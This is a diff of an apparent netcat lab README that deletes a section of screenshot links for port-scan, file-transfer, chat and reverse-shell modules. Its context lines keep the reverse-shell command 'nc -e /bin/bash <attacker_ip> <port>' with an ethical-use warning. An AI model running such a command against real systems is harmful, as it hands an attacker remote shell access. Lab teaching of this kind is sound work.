@@ -63,58 +63,6 @@ nc <target_ip> 1234
 nc -e /bin/bash <attacker_ip> <port>
 ```
 > ⚠️ Use only in ethical, controlled environments.
->
-> ## 📸 Lab Proof: Screenshots
-
----
-
-### ⚙️ Pre-Module Setup
-
-**Network Configuration**
-![Pre Setup 1](NETCAT%20screenshots/pre-setup-1.png)
-
-**VM Initialization**
-![Pre Setup 2](NETCAT%20screenshots/pre-setup-2.png)
-
-**Shared Folder Mount**
-![Pre Setup 3](NETCAT%20screenshots/pre-setup-3.png)
-
----
-
-### 🔍 Module 1: Port Scan
-
-**Scan Execution**
-![Port Scan 1](NETCAT%20screenshots/port-scan-1.png)
-
-**Verbose Output**
-![Port Scan 2](NETCAT%20screenshots/port-scan-2.png)
-
----
-
-### 📁 Module 2: File Transfer
-
-**Sender Terminal**
-![File Transfer 1](NETCAT%20screenshots/file-transfer-1.png)
-
-**Receiver Confirmation**
-![File Transfer 2](NETCAT%20screenshots/file-transfer-2.png)
-
----
-
-### 💬 Module 3: Chat Simulation
-
-**Message Exchange**
-![Chat Simulation](NETCAT%20screenshots/chat-1.png)
-
----
-
-### 🧠 Module 4: Reverse Shell
-
-**Listener Setup**
-![Reverse Shell 1](NETCAT%20screenshots/reverse-shell-1.png)
-
-**Shell Access**
-![Reverse Shell 2](NETCAT%20screenshots/reverse-shell-2.png)
 
 
 ---
